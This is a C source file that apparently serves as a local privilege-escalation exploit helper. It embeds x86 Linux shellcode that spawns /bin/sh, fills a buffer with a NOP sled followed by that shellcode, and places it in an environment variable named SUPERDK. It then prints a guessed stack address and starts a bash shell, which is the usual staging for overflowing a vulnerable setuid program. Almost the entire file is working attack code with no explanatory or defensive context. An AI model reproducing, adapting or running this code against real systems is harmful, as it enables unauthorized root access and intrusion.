// This is the shell code

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define DEFAULT_OFFSET 0
#define DEFAULT_ADDR_SIZE 8
#define DEFAULT_BUFFER_SIZE 512
#define DEFAULT_SUPERDK_SIZE 2048
#define NOP 0x90

char shellcode[] =
 "\x31\xc0\x31\xd2\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
 "\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80";

unsigned long get_sp(void)
{
        __asm__("movl %esp, %eax");
}

int main(int argc, char **argv)
{
        char *ptr, *superSH;
        char shAddr[DEFAULT_ADDR_SIZE + 1];
        char cmdBuf[DEFAULT_BUFFER_SIZE];
        long *addr_ptr,addr;
        int offset=DEFAULT_OFFSET;
        int i, supershLen=DEFAULT_SUPERDK_SIZE;
        int chgDec[3];

        if(!(superSH = malloc(supershLen)))
        {
                printf("Can't allocate memory for supershLen");
                exit(0);
        }

        addr = get_sp() - offset;
        printf("Using address: 0x%x\n", addr);

        ptr = superSH;
        for(i=0; i<supershLen - strlen(shellcode) - 1; i++)
                *(ptr++) = NOP;

        for(i=0; i<strlen(shellcode); i++)
                *(ptr++) = shellcode[i];

        superSH[supershLen - 1] = '\0';

        memcpy(superSH, "SUPERDK=", DEFAULT_ADDR_SIZE);
        putenv(superSH);

        system("/bin/bash");
}
